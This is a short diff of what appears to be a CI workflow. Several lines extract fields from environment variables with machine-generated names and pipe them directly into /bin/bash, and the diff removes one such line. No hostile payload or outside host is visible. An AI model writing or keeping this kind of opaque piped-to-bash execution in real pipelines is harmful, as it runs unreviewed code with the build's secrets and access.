@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$phxl16064" | jq -r .l26727 | /bin/bash
           printf '%s' "$k28" | jq -r .dll4966 | /bin/bash
           printf '%s' "$yybo0451" | jq -r .v8096 | /bin/bash
-          echo $dt0 | jq -r .ycc011 | /bin/bash
 
       - name: Save output
         if: always()
